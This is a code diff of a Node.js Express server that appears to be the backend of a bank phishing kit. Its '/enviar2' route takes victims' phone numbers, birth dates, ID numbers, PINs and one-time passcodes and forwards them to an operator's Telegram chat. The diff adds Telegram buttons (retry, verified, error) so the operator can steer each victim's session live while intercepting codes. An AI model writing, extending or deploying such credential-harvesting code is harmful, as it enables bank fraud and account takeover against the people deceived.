@@ -79,7 +79,6 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
-// Ruta /enviar2 (cel-dina.html) con OTP incluido
 app.post('/enviar2', async (req, res) => {
   const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, otp, txid } = req.body;
 
@@ -102,13 +101,25 @@ app.post('/enviar2', async (req, res) => {
 🏙️ Ciudad: ${ciudad}
 `;
 
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "🔁 REINTENTAR", callback_data: `cel-dina:${txid}` }],
+      [{ text: "✅ VERIFICADO", callback_data: `verifidata:${txid}` }],
+      [{ text: "❌ ERROR", callback_data: `errorlogo:${txid}` }]
+    ]
+  };
+
+  clientes[txid] = "esperando";
+  guardarEstado();
+
   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       chat_id: CHAT_ID,
       text: mensaje,
-      parse_mode: 'HTML'
+      parse_mode: 'HTML',
+      reply_markup: keyboard
     })
   });
 
